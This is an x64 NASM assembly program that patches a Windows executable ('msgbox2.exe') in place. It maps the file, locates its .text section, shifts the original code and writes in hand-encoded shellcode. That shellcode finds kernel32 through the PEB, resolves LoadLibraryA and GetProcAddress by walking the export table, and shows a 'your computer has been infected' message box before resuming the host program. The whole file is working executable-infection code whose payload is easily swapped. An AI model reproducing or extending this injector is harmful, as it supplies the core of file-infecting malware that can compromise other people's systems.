[BITS 64]

%include "nasmx.inc"
%include "win32/kernel32.inc"
%include "win32/windows.inc"

SECTION .rodata

filename db "msgbox2.exe", 0

%macro defstring 2
%1 db %2, 0
%strlen %1_sz %2
%assign %1_sz   %1_sz + 1
%endmacro

defstring text_section_name, ".text"

%define _kernel32_dll __utf16__("KERNEL32.DLL")
kernel32_dll dw _kernel32_dll
kernel32_dll_sz equ 24

defstring user32, "user32"
defstring f_loadlibrary, "LoadLibraryA"
defstring f_getprocaddr, "GetProcAddress"
defstring f_msgbox, "MessageBoxA"
defstring msgbox_title, "DIE DIE DIE"
defstring msgbox_text, "your computer has been infected and will be destroyed as soon as you close this window"

SECTION .text

extern CreateFile
extern CreateFileMapping
extern MapViewOfFile
extern UnmapViewOfFile
extern CloseHandle
extern ExitProcess

extern GetLastError

PAGE_READWRITE  equ 4

open_exe:
    push    rbp
    mov     rbp, rsp
;; CreateFile
    mov     rcx, filename
    mov     rdx, GENERIC_READ | GENERIC_WRITE
    xor     r8, r8
    xor     r9, r9
    push    0
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_EXISTING
    sub     rsp, 20h
    call    CreateFile
    mov     rsp, rbp
    cmp     rax, INVALID_HANDLE_VALUE
    je      .fail
    push    rax
;; CreateFileMapping
    mov     rcx, rax
    xor     rdx, rdx
    mov     r8, PAGE_READWRITE
    xor     r9, r9
    push    0
    push    0
    sub     rsp, 20h
    call    CreateFileMapping
    add     rsp, 30h
    or      rax, 0
    jz      .fail
;; MapViewOfFile
    mov     rcx, rax
    mov     rdx, FILE_MAP_WRITE
    xor     r8, r8
    xor     r9, r9
    push    0
    sub     rsp, 20h
    call    MapViewOfFile
    add     rsp, 28h
    or      rax, 0
    jz      .fail
    push    rax
    xor     rax, rax
    jmp     .ret
.fail:
    call    GetLastError
    mov     rax, 1
.ret:
    pop     rdx
    pop     rcx
    mov     rsp, rbp
    pop     rbp
    ret

close_exe:
    push    rbp
    mov     rbp, rsp
    push    rcx
    mov     rcx, rdx
    sub     rsp, 20h
    call    UnmapViewOfFile
    add     rsp, 20h
    or      al, 0
    pop     rcx
    jz      .fail
    sub     rsp, 20h
    call    CloseHandle
    add     rsp, 20h
    or      al, 0
    jz      .fail
    xor     rax, rax
    jmp     .ret
.fail:
    mov     rax, 1
.ret:
    mov     rsp, rbp
    pop     rbp
    ret

get_code_addr:
    push    rbp
    mov     rbp, rsp
    push    rbx
    push    rcx
    mov     rbx, rcx
    xor     rax, rax
    mov     eax, [rbx + 03Ch]
    mov     edx, [rbx + rax]
    cmp     edx, 00004550h              ;; check PE signature
    jne     .fail
    add     eax, 4                      ;; COFF file header
    mov     cx, [rbx + rax + 2]         ;; number of sections
    movzx   edx, word [rbx + rax + 10h] ;; optional header size
    add     eax, 14h                    ;; COFF optional header
    add     eax, edx                    ;; sections
    cld
.locate_text:
    mov     r8, rax
    push    rcx
    movzx   rax, cx
    dec     rax
    mov     cx, 28h
    mul     cx
    add     rax, r8
    lea     rdi, [rbx + rax]
    mov     rsi, text_section_name
    mov     ecx, text_section_name_sz
    repe cmpsb
    pop     rcx
    mov     rax, r8
    je      .text_found
    loop    .locate_text
    jmp     .fail
.text_found:
    add     rbx, rax    ;; sections base
    add     rbx, 14h    ;; raw data ptr offset
    mov     ax, cx
    dec     ax
    mov     cx, 28h
    mul     cx
    movzx   rax, ax
    mov     rax, [rbx + rax]    ;; raw data ptr
    pop     rbx
    add     rax, rbx
    jmp     .ret
.fail:
    mov     rax, 0
.ret:
    pop     rbx
    mov     rsp, rbp
    pop     rbp
    ret

inject_msgbox:
    push    rbp
    mov     rbp, rsp
    push    rbx
    mov     rbx, rcx
    mov     rdx, rcx
    xor     rcx, rcx
.locate:
    or      qword [rbx + rcx * 8], 0
    jz      .shift_code
    inc     cl
    jmp     .locate
.shift_code:
    lea     eax, [(ecx + 1) * 8]
    lea     rsi, [rbx + (rcx - 1) * 8 + 2]
    lea     rdi, [rbx + rcx * 8]
    std
rep movsq
;; push 2nd instruction location
    lea     rcx, [rbx + 8]
    push    rcx
;; jmp injected code
    lea     ecx, [eax + kernel32_dll_sz + f_loadlibrary_sz + user32_sz + f_getprocaddr_sz + f_msgbox_sz + msgbox_title_sz + msgbox_text_sz]
    add     ecx, 4   ; get_eip
    sub     ecx, 5   ; jmp
    mov     byte [rbx + 0], 0E9h
    mov     [rbx + 1], ecx
    add     rbx, rax

;; inject strings
    mov     ecx, 12
    mov     rsi, kernel32_dll
    mov     rdi, rbx
    cld
.load_unicode_char:
    movsw
    loop    .load_unicode_char
    add     rbx, 24

    %macro inject_string 1
    mov     ecx, %1_sz
    mov     rsi, %1
    mov     rdi, rbx
    rep movsb
    add     rbx, %1_sz
    %endmacro

    inject_string f_loadlibrary
    inject_string user32
    inject_string f_getprocaddr
    inject_string f_msgbox
    inject_string msgbox_title
    inject_string msgbox_text

;; get_eip trick
    ; mov   eax, [esp]
    mov     byte [rbx + 0], 8Bh
    mov     word [rbx + 1], 2404h
    add     rbx, 3
    ; ret
    mov     byte [rbx], 0C3h
    inc     rbx
    ; call get_eip
    mov     byte [rbx + 0], 0E8h
    mov     dword [rbx + 1], 0FFFFFFF7h
    add     rbx, 5
    ; mov edx, eax
    mov     word [rbx], 0D08Bh
    add     rbx, 2

;; retrieve kernel32.dll base
    ; 9 = get_eip trick size
    lea     ecx, [9 + kernel32_dll_sz + f_loadlibrary_sz + user32_sz + f_getprocaddr_sz + f_msgbox_sz + msgbox_title_sz + msgbox_text_sz]
    ; sub edx, X (kernel32_dll) X = ecx in injector
    mov     byte [rbx + 0], 81h
    mov     byte [rbx + 1], 0EAh
    mov     [rbx + 2], ecx
    add     rbx, 6
    ; mov eax, PEB_addr
    mov     byte [rbx + 0], 64h ; fs segment override
    mov     byte [rbx + 1], 0A1h
    mov     dword [rbx + 2], 30h
    add     rbx, 6
    ; mov eax, LDR_addr
    mov     byte [rbx + 0], 8Bh
    mov     byte [rbx + 1], 40h
    mov     byte [rbx + 2], 0Ch
    add     rbx, 3
    ; mov eax, 1st_module_list_entry_addr
    mov     byte [rbx + 0], 8Bh
    mov     byte [rbx + 1], 40h
    mov     byte [rbx + 2], 14h
    add     rbx, 3
    ; mov edi, edx
    mov     word [rbx], 0FA8Bh
    add     rbx, 2
    ; mov esi, [eax + 28h]
    mov     word [rbx + 0], 708Bh
    mov     byte [rbx + 2], 28h
    add     rbx, 3
    ; mov ecx, 24
    mov     byte [rbx + 0], 0B9h
    mov     dword [rbx + 1], 18h
    add     rbx, 5
    ; repe cmpsb
    mov     word [rbx], 0A6F3h
    add     rbx, 2
    ; je found
    mov     word [rbx], 0474h
    add     rbx, 2
    ; mov eax, nxt_module_list_entry
    mov     word [rbx], 008Bh
    add     rbx, 2
    ; jmp search
    mov     word [rbx], 0EEEBh  ; -18
    add     rbx, 2
    ; mov eax, kernel32_base_addr
    mov     word [rbx + 0], 408Bh
    mov     byte [rbx + 2], 10h
    add     rbx, 3
    ; mov ebx, eax
    mov     word [rbx], 0D88Bh
    add     rbx, 2

;; retrieve edata section base (export directory table address)
    ; add eax, PE_sign_RVA
    mov     word [rbx + 0], 4003h
    mov     byte [rbx + 2], 3Ch
    add     rbx, 3
    ; mov eax, [eax + 78h] (export_directory_table_RVA => edata section base RVA)
    mov     word [rbx + 0], 408Bh
    mov     byte [rbx + 2], 78h     ; 4 (signature size) + 20 (COFF header size) + 96 (offset in optional header)
    add     rbx, 3
    ; add eax, ebx
    mov     word [rbx], 0C303h
    add     rbx, 2

%macro kernel32_sym 3   ; sym, load_edata, save_edata
    ; eax = edata section base
 %if %2 == 0
    ; push eax
    mov     byte [rbx], 50h
    inc     rbx
 %else
    ; mov eax, [esp]
    mov     byte [rbx + 0], 8Bh
    mov     word [rbx + 1], 2404h
    add     rbx, 3
 %endif
    ; push edx
    mov     byte [rbx], 52h
    inc     rbx
    ; mov ecx, [eax + 18h] (num_name_entries)
    mov     word [rbx + 0], 488Bh
    mov     byte [rbx + 2], 18h
    add     rbx, 3
    ; mov eax, [eax + 20h] (name_ptr_table_addr)
    mov     word [rbx + 0], 408Bh
    mov     byte [rbx + 2], 20h
    add     rbx, 3
    ; add eax, ebx
    mov     word [rbx], 0C303h
    add     rbx, 2
    ; mov edx, ecx
    mov     word [rbx], 0D18Bh
    add     rbx, 2
    ; mov ecx, f_getmodhandle_sz
    mov     byte [rbx + 0], 0B9h
    mov     dword [rbx + 1], %1_sz - 1
    add     rbx, 5
    ; dec edx
    mov     byte [rbx], 4Ah
    inc     rbx
    ; mov edi, [esp] (sym)
    mov     byte [rbx + 0], 8Bh
    mov     word [rbx + 1], 243Ch
    add     rbx, 3
    ; mov esi, ebx
    mov     word [rbx], 0F38Bh
    add     rbx, 2
    ; add esi, name_ptr_RVA
    mov     byte [rbx + 0], 03h
    mov     byte [rbx + 1], 34h
    mov     byte [rbx + 2], 90h ; src = [eax + edx * 4]
    add     rbx, 3
    ; repe cmpsb
    mov     word [rbx], 0A6F3h
    add     rbx, 2
    ; jne search
    mov     word [rbx], 0EE75h
    add     rbx, 2
    ; mov eax, [esp+4] (export table RVA)
    mov     byte [rbx + 0], 8Bh
    mov     dword [rbx + 1], 042444h    ; 0100 0100 ; 0010 0100 ; 4
    add     rbx, 4
    ; mov eax, [eax + 24h] (ordinal_table_RVA)
    mov     word [rbx + 0], 408Bh
    mov     byte [rbx + 2], 24h
    add     rbx, 3
    ; add eax, ebx
    mov     word [rbx], 0C303h
    add     rbx, 2
    ; mov cx, ordinal
    mov     byte [rbx + 0], 66h ; operand size prefix (16-bit dest)
    mov     byte [rbx + 1], 8Bh
    mov     byte [rbx + 2], 0Ch
    mov     byte [rbx + 3], 50h ; src = [eax + edx * 2]
    add     rbx, 4
    ; pop edx
    mov     byte [rbx], 5Ah
    inc     rbx
    ; eax = edata section base
 %if %3 == 0
    ; pop eax
    mov     byte [rbx], 58h
    inc     rbx
 %else
    ; mov eax, [esp]
    mov     byte [rbx + 0], 8Bh
    mov     word [rbx + 1], 2404h
    add     rbx, 3
 %endif
; XXX needed according to spec, but it works only without... good job microsoft!
    ; sub ecx, [eax + 10h] (ordinal_base)
;   mov     word [rbx + 0], 482Bh
;   mov     byte [rbx + 2], 10h
;   add     rbx, 3
    ; mov eax, [eax + 1Ch] (export_addr_table_RVA)
    mov     word [rbx + 0], 408Bh
    mov     byte [rbx + 2], 1Ch
    add     rbx, 3
    ; add eax, ebx
    mov     word [rbx], 0C303h
    add     rbx, 2
    ; mov eax, [eax + ecx * 4] (sym RVA)
    mov     byte [rbx + 0], 8Bh
    mov     word [rbx + 1], 8804h
    add     rbx, 3
    ; add eax, ebx
    mov     word [rbx], 0C303h
    add     rbx, 2
%endmacro

;; LoadLibraryA("user32")
    ; add edx, 24 ("KERNEL32.dll")
    mov     word [rbx + 0], 0C283h
    mov     byte [rbx + 2], 18h
    add     rbx, 3
    kernel32_sym f_loadlibrary, 0, 1
    ; add edx, f_loadlibrary_sz (edx = "user32")
    mov     byte [rbx + 0], 83h
    mov     byte [rbx + 1], 0C2h
    mov     byte [rbx + 2], f_loadlibrary_sz
    add     rbx, 3
    ; push edx (used in stdcall, save for later)
    mov     byte [rbx], 52h
    inc     rbx
    ; push edx
    mov     byte [rbx], 52h
    inc     rbx
    ; call eax
    mov     word [rbx], 0D0FFh
    add     rbx, 2
    ; pop edx
    mov     byte [rbx], 5Ah
    inc     rbx
    ; pop ecx
    mov     byte [rbx], 59h
    inc     rbx
    ; push eax
    mov     byte [rbx], 50h
    inc     rbx
    ; push ecx
    mov     byte [rbx], 51h
    inc     rbx

;; GetProcAddress(h_user32, "MessageBoxA")
    ; add edx, user32_sz (edx = "GetProcAddress")
    mov     byte [rbx + 0], 83h
    mov     byte [rbx + 1], 0C2h
    mov     byte [rbx + 2], user32_sz
    add     rbx, 3
    kernel32_sym f_getprocaddr, 1, 0
    ; add edx, f_getprocaddr_sz (edx = "MessageBoxA")
    mov     byte [rbx + 0], 83h
    mov     byte [rbx + 1], 0C2h
    mov     byte [rbx + 2], f_getprocaddr_sz
    add     rbx, 3
    ; pop ecx
    mov     byte [rbx], 59h
    inc     rbx
    ; push edx (used in stdcall, save for later)
    mov     byte [rbx], 52h
    inc     rbx
    ; push edx
    mov     byte [rbx], 52h
    inc     rbx
    ; push ecx
    mov     byte [rbx], 51h
    inc     rbx
    ; call eax
    mov     word [rbx], 0D0FFh
    add     rbx, 2
    ; pop edx
    mov     byte [rbx], 5Ah
    inc     rbx

;; MessageBoxA(0, text, title, 0)
    ; push 0
    mov     byte [rbx + 0], 6Ah
    mov     byte [rbx + 1], 00h
    add     rbx, 2
    ; add edx, f_msgbox_sz (edx = msgbox_title)
    mov     byte [rbx + 0], 83h
    mov     byte [rbx + 1], 0C2h
    mov     byte [rbx + 2], f_msgbox_sz
    add     rbx, 3
    ; push edx
    mov     byte [rbx], 52h
    inc     rbx
    ; add edx, msgbox_title_sz (edx = msgbox_text)
    mov     byte [rbx + 0], 83h
    mov     byte [rbx + 1], 0C2h
    mov     byte [rbx + 2], msgbox_title_sz
    add     rbx, 3
    ; push edx
    mov     byte [rbx], 52h
    inc     rbx
    ; push 0
    mov     byte [rbx + 0], 6Ah
    mov     byte [rbx + 1], 00h
    add     rbx, 2
    ; call eax
    mov     word [rbx], 0D0FFh
    add     rbx, 2

;; jmp on 2nd instruction @ code_start + code_shift
    pop     rcx
    mov     rax, rbx
    add     rax, 5
    sub     rax, rcx
    neg     eax
    mov     byte [rbx], 0E9h
    mov     [rbx + 1], eax
    pop     rbx
    mov     rsp, rbp
    pop     rbp
    ret

global _start
_start:
;; Load EXE
    call    open_exe
    or      rax, 0
    jnz     .fail
    push    rcx
    push    rdx
;; Inject msg box
    mov     rcx, rdx
    call    get_code_addr
    or      rax, 0
    jz      .fail
    mov     rcx, rax
    call    inject_msgbox
;; Unload EXE
    pop     rdx
    pop     rcx
    call    close_exe
    or      al, 0
    jnz     .fail
    mov     rcx, 0
    jmp     .end
.fail:
    mov     rcx, 1
.end:
    add     rsp, 10h
    call    ExitProcess
